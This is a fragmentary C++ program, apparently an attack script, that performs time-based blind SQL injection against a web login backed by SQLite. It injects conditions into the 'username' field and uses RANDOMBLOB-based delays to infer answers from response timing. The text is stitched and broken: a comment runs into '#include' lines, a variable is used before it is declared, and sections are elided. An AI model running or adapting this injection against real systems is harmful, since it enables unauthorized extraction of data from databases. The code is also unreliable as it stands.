...
int main() {
    ...
    // Write to file#include <curl/curl.h>
#include <chrono>
#include <iostream>
#include <string>
#include <vector>
...
string sleep(double sleeptime) {
    int randnum = get_random_num();
    return to_string(randnum) + "=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(" + to_string((int) (sleeptime * 100000000 / 2)) + "))))";
}
...
bool is_true(const string& condition) {
    double sleeptime = 2 * duration;
    if (sleeptime >= 20) // sleeptime has to be less than 20 seconds, otherwise sqlite3's RANDOMBLOB fails and does not do the proper delay
        sleeptime = first_sleep;

    string postFields = "username=admin' and " + condition + " and " + sleep(sleeptime) + "--";
    // cout << condition << "\n";
    // cout << "sleeptime: " << 2 * duration << "\n";

    double duration = measure_request(postFields);
    // cout << "duration: " << duration << "\n";
    if (duration < 0.75 * sleeptime) {
        return false;
    }
    return !is_true("NOT (" + condition + ")");
}
